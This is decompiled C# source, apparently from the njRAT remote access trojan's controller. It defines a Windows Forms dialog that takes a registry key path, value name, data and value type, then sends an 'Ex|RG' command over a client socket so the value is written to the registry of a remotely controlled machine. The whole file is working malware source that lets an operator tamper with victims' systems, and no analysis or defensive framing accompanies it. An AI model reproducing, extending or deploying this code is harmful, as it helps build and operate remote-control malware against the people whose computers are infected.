using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000023 RID: 35
	[DesignerGenerated]
	public partial class RGv : Form
	{
		// Token: 0x060004BD RID: 1213 RVA: 0x00170244 File Offset: 0x0016E644
		[DebuggerNonUserCode]
		public RGv()
		{
			RGv.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x060004BE RID: 1214 RVA: 0x0017025C File Offset: 0x0016E65C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = RGv.__ENCList;
			lock (_ENCList)
			{
				bool flag = RGv.__ENCList.Count == RGv.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = RGv.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = RGv.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								RGv.__ENCList[num] = RGv.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					RGv.__ENCList.RemoveRange(num, RGv.__ENCList.Count - num);
					RGv.__ENCList.Capacity = RGv.__ENCList.Count;
				}
				RGv.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x170001AE RID: 430
		// (get) Token: 0x060004C1 RID: 1217 RVA: 0x001709CC File Offset: 0x0016EDCC
		// (set) Token: 0x060004C2 RID: 1218 RVA: 0x001709E4 File Offset: 0x0016EDE4
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x170001AF RID: 431
		// (get) Token: 0x060004C3 RID: 1219 RVA: 0x001709F0 File Offset: 0x0016EDF0
		// (set) Token: 0x060004C4 RID: 1220 RVA: 0x00170A08 File Offset: 0x0016EE08
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x170001B0 RID: 432
		// (get) Token: 0x060004C5 RID: 1221 RVA: 0x00170A14 File Offset: 0x0016EE14
		// (set) Token: 0x060004C6 RID: 1222 RVA: 0x00170A2C File Offset: 0x0016EE2C
		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		// Token: 0x170001B1 RID: 433
		// (get) Token: 0x060004C7 RID: 1223 RVA: 0x00170A38 File Offset: 0x0016EE38
		// (set) Token: 0x060004C8 RID: 1224 RVA: 0x00170A50 File Offset: 0x0016EE50
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x170001B2 RID: 434
		// (get) Token: 0x060004C9 RID: 1225 RVA: 0x00170A5C File Offset: 0x0016EE5C
		// (set) Token: 0x060004CA RID: 1226 RVA: 0x00170A74 File Offset: 0x0016EE74
		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		// Token: 0x170001B3 RID: 435
		// (get) Token: 0x060004CB RID: 1227 RVA: 0x00170A80 File Offset: 0x0016EE80
		// (set) Token: 0x060004CC RID: 1228 RVA: 0x00170A98 File Offset: 0x0016EE98
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170001B4 RID: 436
		// (get) Token: 0x060004CD RID: 1229 RVA: 0x00170AF8 File Offset: 0x0016EEF8
		// (set) Token: 0x060004CE RID: 1230 RVA: 0x00170B10 File Offset: 0x0016EF10
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x060004CF RID: 1231 RVA: 0x00170B1C File Offset: 0x0016EF1C
		private void Button1_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"Ex",
				Class7.string_1,
				"RG",
				Class7.string_1,
				"!",
				Class7.string_1,
				this.Path,
				Class7.string_1,
				this.TextBox1.Text,
				Class7.string_1,
				this.TextBox3.Text,
				Class7.string_1,
				Conversions.ToString(this.Typ(this.ComboBox1.Text))
			}));
			this.Close();
		}

		// Token: 0x060004D0 RID: 1232 RVA: 0x00170BE4 File Offset: 0x0016EFE4
		public int Typ(string t)
		{
			string text = t.ToLower();
			bool flag = Operators.CompareString(text, RegistryValueKind.Binary.ToString().ToLower(), false) == 0;
			int num = 0;
			if (flag)
			{
				num = 3;
			}
			else
			{
				flag = Operators.CompareString(text, RegistryValueKind.DWord.ToString().ToLower(), false) == 0;
				if (flag)
				{
					num = 4;
				}
				else
				{
					flag = Operators.CompareString(text, RegistryValueKind.ExpandString.ToString().ToLower(), false) == 0;
					if (flag)
					{
						num = 2;
					}
					else
					{
						flag = Operators.CompareString(text, RegistryValueKind.MultiString.ToString().ToLower(), false) == 0;
						if (flag)
						{
							num = 7;
						}
						else
						{
							flag = Operators.CompareString(text, RegistryValueKind.QWord.ToString().ToLower(), false) == 0;
							if (flag)
							{
								num = 11;
							}
							else
							{
								flag = Operators.CompareString(text, RegistryValueKind.String.ToString().ToLower(), false) == 0;
								if (flag)
								{
									num = 1;
								}
								else
								{
									int num2 = 0;
									num = num2;
								}
							}
						}
					}
				}
			}
			return num;
		}

		// Token: 0x0400022E RID: 558
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000230 RID: 560
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000231 RID: 561
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x04000232 RID: 562
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x04000233 RID: 563
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000234 RID: 564
		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		// Token: 0x04000235 RID: 565
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000236 RID: 566
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x04000237 RID: 567
		public string Path;

		// Token: 0x04000238 RID: 568
		public Client sk;
	}
}
